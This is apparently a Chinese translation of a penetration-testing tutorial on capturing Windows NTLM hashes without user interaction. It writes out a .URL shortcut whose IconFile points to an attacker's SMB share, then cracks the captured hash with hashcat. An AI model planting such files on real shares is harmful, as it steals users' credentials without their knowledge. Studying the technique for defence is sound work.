**这段时间我在微博上翻看了大量的帖子，其中有一篇来自@insertscript的帖子，介绍了一种无交互式抓取哈希值的技巧。其使用.URL文件访问环境变量，用户无需任何用户交互即可连接到攻击者的文件共享。**

以下内容摘自@insertscript的帖子：

>
> “只要explorer.exe的的查看包含.URL文件的文件夹，它就会在发送实际请求之前查找任何指定的环境变量，如％PATH％或％USERNAME％，从而将内容泄露给由攻击者控制的服务器。“（<https://insert-> script.blogspot.com/2018/08/leaking-environment-variables-in_20.html>）

首先，我们在攻击机上设置SMBListener（通常情况下在内网环境中，大多数公司都会阻止SMB流量出站）。

![1_fQk9ruNetDY_W2mjcmGuRw.png](https://image.3001.net/images/20180930/1538262997_5bb007d52a08d.png!small)

接着，我们在文件共享上创建一个文本文件。（创建文件后，你可以将其放在任何共享上）。

![2_ojHHReMZNe_wptxFkhJzUw.png](https://image.3001.net/images/20180930/1538263012_5bb007e41ff29.png!small)

将以下内容粘贴到文本文件中：

    
    
    [InternetShortcut]
    
    URL=whatever
    
    WorkingDirectory=whatever
    
    IconFile=\\PutYourSmbListenerShareHere\%USERNAME%.icon
    
    IconIndex=1

以上你只需将IconFile
PATH替换为你在SMBServer，Responder或Inveigh中设置的共享即可。注意：这里的％USERNAME％。icon不要改动。如下：

![1_QLEF1Z4Nxy-GQ-VfipqzJA.png](https://image.3001.net/images/20180930/1538263042_5bb008023608a.png!small)

现在，请确保你已勾选文件名扩展和隐藏文件选项。

![1_C8fpG9Vax8N9tqqbWXpE-Q.png](https://image.3001.net/images/20180930/1538263084_5bb0082c262bb.png!small)

使用.URL扩展重命名文件注意：当使用相同文件名时，将导致无法正常工作因此，建议大家每次都只创建唯一的文件名（例如1.url，2.url等）！

![1_M2cD10jjIKMqNFzhG_wP6g.png](https://image.3001.net/images/20180930/1538263110_5bb008465d8f2.png!small)

重命名后应该看起来像下面这样：

![1_3d_YzY0RiuFhM1A__jKwrA.png](https://image.3001.net/images/20180930/1538263149_5bb0086d5f8fc.png!small)

此时，在你的smb listener应该已经获取到了一个连接！

![1_1dLpEk4FL0MKuQsyTdQjxQ.png](https://image.3001.net/images/20180930/1538263178_5bb0088a73558.png!small)

现在，任何人只要访问该共享，都将尝试自动的向你的SMB listener进行身份验证。

复制哈希并使用hashcat破解。

![1_fCcNzzty8DFieV3Rvc6JBA.png](https://image.3001.net/images/20180930/1538263225_5bb008b9108b0.png!small)

将其粘贴到文件中

![10_jGAre-VqZi-Qy2sGbsZ_Dg.png](https://image.3001.net/images/20180930/1538263249_5bb008d10a33f.png!small)

启动hashcat（希望密码包含在你的字典列表中）

![1_O4Yw2yBO-reeoKgTh5l7nw.png](https://image.3001.net/images/20180930/1538263274_5bb008eadbb85.png!small)

成功解出了密码！

![1_pWAvweKQObHkYcCPR5aiNA.png](https://image.3001.net/images/20180930/1538263309_5bb0090d8a85f.png!small)

最后，感谢@insertscript的分享！也希望大家可以在微博上关注我（@_markmo_），我会第一时间向大家分享我学到的东西，就像其他人给予我的一样！

 ***参考来源：[medium](https://medium.com/@markmotig/a-better-way-to-capture-hashes-with-no-user-interaction-by-markmo-bd1569bfa208)，FB小编secist编译，转载请注明来自FreeBuf.COM**

